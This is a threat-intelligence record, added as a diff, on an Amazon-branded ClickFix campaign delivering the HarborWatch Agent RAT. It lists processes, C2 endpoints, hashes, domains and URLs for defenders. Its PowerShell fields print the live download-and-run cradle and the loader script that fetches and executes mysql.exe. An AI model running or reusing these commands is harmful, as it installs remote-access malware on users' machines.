@@ -1,0 +1,67 @@
+title: Amazon-Themed ClickFix Campaign Delivers HarborWatch Agent RAT
+description: Threat actors abuse Amazon branding and ClickFix self-infection technique
+  to deliver HarborWatch Agent, a custom remote access trojan, by tricking users into
+  running malicious PowerShell commands disguised as CAPTCHA verification. The malware
+  connects to a C2 server and collects system information including OS version, hostname,
+  CPU count, disk usage, memory usage, and network status.
+attribution: ''
+malware_families:
+- HarborWatch Agent
+- Harbor Sentinel
+- HarborWatchAgent
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - mysql.exe
+  command_lines: []
+  powershell:
+  - IEX ((new-object net.webclient).downloadstring("https://amazonalert.xyz/download/code.txt"))
+  scripts:
+  - "$FileName = \"mysql.exe\"\n$downloadPath = Join-Path -Path $env:TEMP -ChildPath\
+    \ $FileName\n$url = \"https://zoomupdate.b-cdn.net/mysql.exe\"\ntry {\n    Invoke-WebRequest\
+    \ -Uri $url -OutFile $downloadPath -UseBasicParsing\n    Start-Process -FilePath\
+    \ $downloadPath -ArgumentList \"--pass=JHSgfsa2652\" -Wait\n    Write-Host \"\
+    SUCCESS\" -ForegroundColor Green -NoNewline\n} catch {\n    Write-Error \"Error:\
+    \ $_\"\n}"
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - mysql.exe -> 185.193.127[.]44
+  - mysql.exe -> 185.193.127[.]44/api/heartbeat
+  - mysql.exe -> 185.193.127[.]44/api/agent/tasks/claim
+  - HarborWatchAgent -> 185.193.127[.]44
+  file_activity:
+  - mysql.exe
+  - Clipboard.ps1
+  - code.txt
+  - C:\Windows\SYSTEM32\en-US\winnlsres.dll.mui
+  persistence: []
+  process_relations:
+  - powershell.exe -> mysql.exe
+iocs:
+  hashes:
+  - 9abebe5a34eefb80db12bf8d51bfe7f7
+  - 5f7bb80bf85c1fae7413eb534cc2f022402c8753f75666525adb1dc85a677f4c
+  - 09c121225fe254676a27c21943506714
+  - cf94ff2ecc4f3157704c9cfed5e446c405e7729141019045cb05ef6ffad122d5
+  - 33760b2aa86deea5805e647197c34ef5
+  - 3a87cab1e8c6868a7939eb422f1851ecc746405cda6b3d3502b9d8eedc360898
+  ip_addresses:
+  - 172.67.190[.]89
+  - 172.67.189[.]76
+  - 185.193.127[.]44
+  domains:
+  - amazonattention[.]com
+  - amazonalert[.]xyz
+  - amazonassist[.]xyz
+  - zoomupdate[.]b-cdn[.]net
+  urls:
+  - hxxps://amazonattention[.]com/verify
+  - hxxps://amazonalert[.]xyz/download/code[.]txt
+  - hxxp://185[.]193[.]127[.]44
+authors:
+- Dylan Main
+reference: https://cofense.com/blog/from-fake-amazon-security-alert-to-harborwatch-agent-clickfix-delivery-of-a-custom-monitoring-rat
+date_of_publication: June 11, 2026
+file_creation_date: June 11, 2026
